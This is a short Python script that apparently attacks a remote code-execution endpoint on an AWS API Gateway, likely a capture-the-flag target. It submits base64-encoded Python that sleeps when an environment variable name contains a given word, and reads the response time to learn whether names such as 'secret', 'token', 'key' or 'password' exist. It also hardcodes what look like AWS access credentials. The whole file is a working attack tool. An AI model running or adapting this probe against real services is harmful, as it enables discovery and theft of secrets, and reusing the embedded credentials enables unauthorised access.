import base64
import requests
import time
from aws_requests_auth.aws_auth import AWSRequestsAuth
import concurrent.futures

auth = AWSRequestsAuth(aws_access_key="ASIARYWSMSYIMLIFTXQE",
                       aws_secret_access_key="2pFYytUGEJ61BMm0LEWESi0d71uWsf2TjoGpwObR",
                       aws_token="",
                       aws_host='l8ssyaz69f.execute-api.us-east-1.amazonaws.com',
                       aws_region='us-east-1',
                       aws_service='execute-api')

url = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"

def test_key_contains(substring):
    code = f"""
import os
import time
for k in os.environ:
    if '{substring}' in k.lower():
        time.sleep(2.5)
        break
"""
    encoded_code = base64.b64encode(code.encode('utf-8')).decode('utf-8')
    start = time.time()
    try:
        requests.post(url, json={"code": encoded_code}, auth=auth, timeout=6)
    except:
        pass
    elapsed = time.time() - start
    return substring, elapsed > 2.0

for sub in ["secret", "flag", "user_agent", "useragent", "agent", "ctf", "mafat", "bypass", "key", "token", "password"]:
    sub, match = test_key_contains(sub)
    print(f"Contains '{sub}': {match}")
